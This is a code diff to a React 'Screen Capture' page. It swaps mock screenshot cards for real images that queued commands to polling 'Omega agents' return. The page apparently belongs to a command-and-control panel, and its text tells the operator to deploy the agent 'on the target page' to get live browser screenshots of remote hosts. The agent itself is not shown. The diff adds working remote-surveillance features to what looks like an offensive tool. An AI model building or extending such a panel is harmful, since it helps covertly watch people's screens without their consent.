@@ -9,52 +9,71 @@ import { Badge } from "@/components/ui/badge";
 import { Skeleton } from "@/components/ui/skeleton";
 import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
 import { format } from "date-fns";
-import { Camera, RefreshCw, Monitor } from "lucide-react";
+import { Camera, RefreshCw, Monitor, ImageOff } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 
-const BASE = import.meta.env.BASE_URL.replace(/\/$/, "");
+const BASE = "/api";
 
-type Screenshot = { id: number; hostId: number; label: string; widthPx: number; heightPx: number; sizeKb: number; createdAt: string };
+type Screenshot = { id: number; hostId: number; label: string; widthPx: number; heightPx: number; sizeKb: number; createdAt: string; hasData?: boolean };
 
 async function fetchShots(hostId: number): Promise<Screenshot[]> {
-  const r = await fetch(`${BASE}/api/screenshots/${hostId}`);
+  const r = await fetch(`${BASE}/screenshots/${hostId}`);
   if (!r.ok) throw new Error("Failed");
   return r.json();
 }
 
-async function captureShot(hostId: number): Promise<Screenshot> {
-  const r = await fetch(`${BASE}/api/screenshots/${hostId}/capture`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ label: "Desktop" }) });
-  if (!r.ok) throw new Error("Failed");
+async function captureShot(hostId: number): Promise<{ queued?: boolean; commandId?: number; message?: string }> {
+  const r = await fetch(`${BASE}/screenshots/${hostId}/capture`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ label: "Page" }),
+  });
+  if (!r.ok) {
+    const err = await r.json().catch(() => ({}));
+    throw new Error((err as any).error || "Failed");
+  }
   return r.json();
 }
 
-const PALETTE = ["#1a1a2e","#16213e","#0f3460","#533483","#2d4059","#1b262c","#0a3d62","#1e3799"];
+function ScreenCard({ shot }: { shot: Screenshot }) {
+  const imgSrc = `${BASE}/screenshots/data/${shot.id}`;
+  const [imgError, setImgError] = useState(false);
 
-function ScreenCard({ shot, seed }: { shot: Screenshot; seed: number }) {
-  const color = PALETTE[seed % PALETTE.length];
-  const color2 = PALETTE[(seed + 3) % PALETTE.length];
   return (
     <Card className="border-border bg-card/40 hover:border-primary/40 transition-all overflow-hidden group">
-      <div className="relative aspect-video" style={{ background: `linear-gradient(135deg, ${color} 0%, ${color2} 100%)` }}>
-        <div className="absolute inset-0 flex items-center justify-center opacity-20">
-          <Monitor className="w-16 h-16 text-white" />
-        </div>
-        <div className="absolute inset-0 opacity-10" style={{
-          backgroundImage: `repeating-linear-gradient(0deg, transparent, transparent 20px, rgba(255,255,255,0.03) 20px, rgba(255,255,255,0.03) 21px),
-            repeating-linear-gradient(90deg, transparent, transparent 20px, rgba(255,255,255,0.03) 20px, rgba(255,255,255,0.03) 21px)`
-        }} />
-        <div className="absolute inset-4 border border-white/10 rounded" />
-        <div className="absolute top-3 left-3 right-3 h-4 bg-white/10 rounded-sm" />
-        <div className="absolute top-9 left-3 w-2/3 h-2 bg-white/5 rounded-sm" />
-        <div className="absolute top-14 left-3 right-3 bottom-3 bg-white/5 rounded-sm" />
-        <div className="absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black/60 to-transparent p-3 translate-y-full group-hover:translate-y-0 transition-transform">
-          <p className="text-xs text-white/80 font-mono">ID #{shot.id} • {shot.widthPx}×{shot.heightPx} • {shot.sizeKb}kb</p>
-        </div>
+      <div className="relative aspect-video bg-black/60">
+        {shot.hasData && !imgError ? (
+          <img
+            src={imgSrc}
+            alt={shot.label}
+            className="w-full h-full object-contain"
+            onError={() => setImgError(true)}
+          />
+        ) : (
+          <div className="absolute inset-0 flex flex-col items-center justify-center gap-2 text-muted-foreground/40">
+            {imgError ? (
+              <ImageOff className="w-10 h-10" />
+            ) : (
+              <>
+                <Monitor className="w-10 h-10" />
+                <span className="text-xs font-mono">awaiting agent</span>
+              </>
+            )}
+          </div>
+        )}
+        {!shot.hasData && (
+          <div className="absolute top-2 right-2">
+            <Badge variant="outline" className="text-[9px] border-yellow-500/40 text-yellow-400">pending</Badge>
+          </div>
+        )}
       </div>
       <CardContent className="p-3">
         <div className="flex items-center justify-between">
-          <Badge variant="outline" className="text-xs font-mono text-primary border-primary/30">{shot.label}</Badge>
-          <span className="text-xs text-muted-foreground font-mono">{format(new Date(shot.createdAt), "MM/dd HH:mm:ss")}</span>
+          <Badge variant="outline" className="text-xs font-mono text-primary border-primary/30 truncate max-w-[140px]" title={shot.label}>{shot.label}</Badge>
+          <div className="text-right">
+            <p className="text-xs text-muted-foreground font-mono">{format(new Date(shot.createdAt), "MM/dd HH:mm:ss")}</p>
+            {shot.sizeKb > 0 && <p className="text-[10px] text-muted-foreground/50">{shot.widthPx}×{shot.heightPx} · {shot.sizeKb}kb</p>}
+          </div>
         </div>
       </CardContent>
     </Card>
@@ -67,19 +86,29 @@ export default function ScreenCapture() {
   const qc = useQueryClient();
   const { toast } = useToast();
 
-  const { data: shots, isLoading } = useQuery({
+  const { data: shots, isLoading, refetch } = useQuery({
     queryKey: ["screenshots", selectedHostId],
     queryFn: () => fetchShots(selectedHostId!),
     enabled: !!selectedHostId,
+    refetchInterval: 5000,
   });
 
   const captureMut = useMutation({
     mutationFn: () => captureShot(selectedHostId!),
-    onSuccess: () => {
+    onSuccess: (data) => {
       qc.invalidateQueries({ queryKey: ["screenshots", selectedHostId] });
-      toast({ title: "Screenshot captured" });
+      if (data.queued) {
+        toast({ title: "Screenshot queued", description: "Agent will capture on next poll (≤3s)" });
+      } else {
+        toast({ title: "Screenshot captured" });
+      }
+    },
+    onError: (e: any) => {
+      toast({ title: "Failed", description: e.message, variant: "destructive" });
     },
   });
+
+  const selectedHost = hosts?.find(h => h.id === selectedHostId);
 
   return (
     <Layout>
@@ -89,7 +118,7 @@ export default function ScreenCapture() {
             <h1 className="text-3xl font-bold tracking-tight flex items-center gap-3">
               <Camera className="h-7 w-7 text-primary" /> Screen Capture
             </h1>
-            <p className="text-muted-foreground mt-1">Remote desktop screenshots from connected hosts.</p>
+            <p className="text-muted-foreground mt-1">Browser canvas screenshots from live Omega agents.</p>
           </div>
           <div className="flex items-center gap-2">
             <Select value={selectedHostId?.toString() ?? ""} onValueChange={v => setSelectedHostId(parseInt(v))}>
@@ -98,7 +127,7 @@ export default function ScreenCapture() {
                 {hosts?.map(h => (
                   <SelectItem key={h.id} value={h.id.toString()}>
                     <span className="flex items-center gap-2">
-                      <span className={`w-2 h-2 rounded-full inline-block ${h.status==='online'?'bg-green-500':h.status==='offline'?'bg-red-500':'bg-gray-500'}`} />
+                      <span className={`w-2 h-2 rounded-full inline-block ${h.status === 'online' ? 'bg-green-500' : h.status === 'offline' ? 'bg-red-500' : 'bg-gray-500'}`} />
                       {h.label}
                     </span>
                   </SelectItem>
@@ -106,13 +135,24 @@ export default function ScreenCapture() {
               </SelectContent>
             </Select>
             {selectedHostId && (
-              <Button onClick={() => captureMut.mutate()} disabled={captureMut.isPending} className="gap-2">
-                <Camera className="h-4 w-4" />
-                {captureMut.isPending ? "Capturing..." : "Capture"}
-              </Button>
+              <>
+                <Button variant="outline" size="icon" onClick={() => refetch()}>
+                  <RefreshCw className="h-4 w-4" />
+                </Button>
+                <Button onClick={() => captureMut.mutate()} disabled={captureMut.isPending} className="gap-2">
+                  <Camera className="h-4 w-4" />
+                  {captureMut.isPending ? "Queuing..." : "Capture"}
+                </Button>
+              </>
             )}
           </div>
         </div>
+
+        {selectedHostId && selectedHost?.status !== "online" && (
+          <div className="bg-yellow-500/10 border border-yellow-500/30 rounded-md p-3 text-yellow-400 text-sm">
+            Host is <strong>{selectedHost?.status ?? "unknown"}</strong> — deploy the Omega agent on the target page first to receive real screenshots.
+          </div>
+        )}
 
         {!selectedHostId ? (
           <Card className="border-border bg-card/40">
@@ -124,11 +164,13 @@ export default function ScreenCapture() {
           </div>
         ) : !shots?.length ? (
           <Card className="border-border bg-card/40">
-            <CardContent className="py-16 text-center text-muted-foreground">No screenshots captured yet. Click Capture to take one.</CardContent>
+            <CardContent className="py-16 text-center text-muted-foreground">
+              No screenshots yet. Click <strong>Capture</strong> to queue a screenshot command — the agent will send the real image on its next poll.
+            </CardContent>
           </Card>
         ) : (
           <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
-            {shots.map((shot, i) => <ScreenCard key={shot.id} shot={shot} seed={shot.id + i} />)}
+            {shots.map(shot => <ScreenCard key={shot.id} shot={shot} />)}
           </div>
         )}
       </div>
